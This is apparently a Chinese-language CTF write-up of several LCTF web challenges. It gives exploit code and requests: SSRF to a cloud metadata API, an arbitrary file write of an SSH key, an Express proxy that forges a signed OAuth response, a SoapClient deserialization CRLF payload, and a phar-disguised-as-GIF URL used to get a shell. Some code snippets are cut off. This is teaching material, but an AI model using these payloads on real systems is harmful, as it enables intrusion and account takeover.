Blog: 
## Web
### Travel
这题的信息搜集手法很有意思，可以说，针对目前所有的云服务商均可以使用这一方法来进行一定程度上的信息搜集。
首先是关键部分的代码：
    @app.route('/upload/', methods = ['PUT'])
    def upload_file(filename):
        name = request.cookies.get('name')
        pwd = request.cookies.get('pwd')
        if name != 'lctf' or pwd != str(uuid.getnode()):
            return "0"
        filename = urllib.unquote(filename)
        with open(os.path.join(app.config['UPLOAD_FOLDER'], filename), 'w') as f:
            f.write(request.get_data(as_text = True))
            return "1"
        return "0"
    @app.route('/', methods = ['GET'])
    def index():
        url = request.args.get('url', '')
        if url == '':
            return render_template('index.html')
        if "http" != url[: 4]:
            return "hacker"
        try:
            response = requests.get(url, timeout = 10)
            response.encoding = 'utf-8'
            return response.text
        except:
            return "Something Error"
我们可以看出，这题的意思非常明显了。`pwd`变量 == 网卡地址，获得这个值即可任意文件写入。而获取这个值的方法是SSRF。  
一般来说，获取网卡地址，需要一个任意文件读取来配合，以便读取`/sys/class/net/eth0/address`。在这里，如果题目是使用PHP的话几乎一下子就能做出来了。但题目是Python
+
`requests`库。`requests`库的底层是`urllib`，而没有任何扩展的`urllib`仅支持`http`和`https`协议，因此我们没有办法读取任意文件。  
——但这是CTF题目，我们查一查IP，就能发现是腾讯云的机器。既然是云服务商，那么通常就会有一个metadata的API。例如，Amazon
EC2，就可以通过  来获取metadata，而所有基于OpenStack搭建的云服务也都使用这个地址。
因此，让我们搜索腾讯云的文档，很容易就能搞出payload：
接着是下一个坑点。使用PUT上传数据，发现被405了……
观察POST和PUT的提示，发现它们不同，因此可以确认是Nginx层面上禁止了PUT。Flask对这个问题有解决方案，即`X-HTTP-Method-Override`头。直接写上即可。后面的内容相对偏向脑洞了。直接通过任意文件写+目录穿越写一个SSH Key。（第一次见到写SSH Key的……）
### EZ OAuth
本题用到的漏洞比较神奇，属于手滑了就很容易写出的逻辑漏洞。
首先是登录后发现必须要用`pwnhub.cn`域名的邮箱。参考Google CTF
2016的题解，猜测它只判断`includes('pwnhub.cn')`而不是`equal('pwnhub.cn')`，因此搞个域名邮箱绕过邮箱验证。
后台发现有个两个接口，分别是`/user/check`和`/admin/auth`。后者没参数，前者的参数分别为`domain`和`email`，且`domain`为隐藏参数。
猜测其为验证服务器，将其改为自己的服务器，得知服务器发送数据；再本地模拟一下，得知服务器返回信息。发现这里有个极度麻烦的sign签名验证，经过测试，其至少和`request-id`和`email`存在关联。因此，我们很难修改回包。因为没有任何可控数据，也无法进行哈希长度扩展攻击。另外，我们发现`/admin/auth`也有一个隐藏的`domain`参数，其除了请求API以外，发送的数据和接受的数据与`/user/check`相同。
既然签名算法无法逆向，那只能进行大胆猜测了。我们不知道`result`参数是否有在被签名的范围之内，如果它没有呢？  
——写个代理，从API获取签名返回值，然后把`result`篡改为true，即可绕过验证，拿到flag。
    const express = require('express')
    const axios = require('axios')
    const app = express()
    const bodyParser = require('body-parser')
    app.use(bodyParser.urlencoded({extended: false}))
    app.use((req, res, next) => {
      const { host, ...headers} = req.headers
      delete headers['content-length']
      axios.request({
        url: `https://lctf.1slb.net/api/user/isAdmin`,
        method: 'POST',
        headers,
        data: Object.keys(req.body).map(k => `${k}=${req.body[k]}`).join('&')
      }).then(p => {
        const data = p.data
        data.result = true
        res.end(JSON.stringify(data))
      })
    });
    app.listen(23456)
这个题目挺有意思的，揭示了一个黄金原则：未将关键参数纳入签名范围内的签名 = 废纸。
### bestphp's revenge
这题和XCTF Final的Web很像，后来问了一下果然是一个出题人……
首先是有个index.php。
    __call()`。
Payload如下：
  1. SoapClient序列化字符生成
        $target, 'location' => $target,'user_agent'=>'cytest^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string));
    $aaa = serialize($b);
    $aaa = str_replace('^^',"\r\n",$aaa);
    $aaa = str_replace('"SoapClient":5','"SoapClient":6',$aaa);
    $aaa = str_replace(';}',';s:1:"C";s:1:"Y',$aaa);
    echo urlencode($aaa);
  2. 第一次访问页面，写入Session：
    POST /?f=session_start&name=上面生成的代码 HTTP/1.1
    Host: kali:8001
    Connection: close
    Cookie: PHPSESSID=CYTEST
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 31
    serialize_handler=php_serialize
  1. 第二次访问页面，反序列化并SSRF。
    POST /?f=extract HTTP/1.1
    Host: 172.81.210.82
    Connection: close
    Cookie: PHPSESSID=CYTEST
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 16
    b=call_user_func
之后就可以直接get flag了。
### T4lk 1s ch34p
攻击链过于明确，生成一个伪装成gif的phar上传文件就是。
    startBuffering();
    $phar->setStub('GIF89a');
    $phar->setMetadata($a);
    $phar->stopBuffering();
之后直接访问
[http://212.64.7.171/LCTF.php?m=check&c=compress.zlib://phar:///var/www/data/dccb75e38fe3fc2c70fd169f263e6d37/avatar.gif&a=phpinfo(](http://212.64.7.171/LCTF.php?m=check&c=compress.zlib://phar:///var/www/data/dccb75e38fe3fc2c70fd169f263e6d37/avatar.gif&a=phpinfo\());
就能getshell了。`compress.zlib`是用于绕过`^phar`的正则检测的。
### L playground2
利用如图特性可目录穿越……  
之后就能拿源码了。  
拿到源码后，发现需要Cookie伪造，阅读 `hash.py` 的`MDA`
    class MDA:
        def insert(self, inBuf):
            self.init()
            self.update(inBuf)
        def grouping(self, inBufGroup):
            hexdigest_group = ''
            for inBuf in inBufGroup:
                self.insert(inBuf)
                hexdigest_group += self.hexdigest()
`grouping` 把 `inBufGroup`
中的每个字符都单独计算hash，因此前后字符对应的hash是无关联的。所以，找到`admin`对应的hash，即找 a, d, m, i, n
每个字符对应的hash。
多发几个包就ok了。
    aYKp9
    b962d95efd252479
    e630b0372a4c511f
    8c6a8874d01df770
    414ec94d852dac00
    0c61993750547727
    KdA0k
    8c6a8874d01df770
    84407154c863ef36
    af028d5ff3351a09
    ee2d222f32215974
    85281413c94bf01e
    FemI5
    0c13310650467719
    4c38032c903bb70e
    e80346042c47531a
    2575a34f6948901b
    6a45a255ae48d51b
    JeeiR
    c451045c08252f78
    4c38032c903bb70e
    4c38032c903bb70e
    6e1beb0db216d969
    6b042d0caf7bd64e
    85K0n
    4428201f883baf0e
    6a45a255ae48d51b
    8c6a8874d01df770
    ee2d222f32215974
    b020cd1cf4031b57
    MFSG22LO.b962d95efd25247984407154c863ef36e80346042c47531a6e1beb0db216d969b020cd1cf4031b57
### God of domain-pentest
其实这题没做出来，就是来分享一个骚操作：
 A modified reGeorg for One-line PHP
Shell.
用于本题有奇效。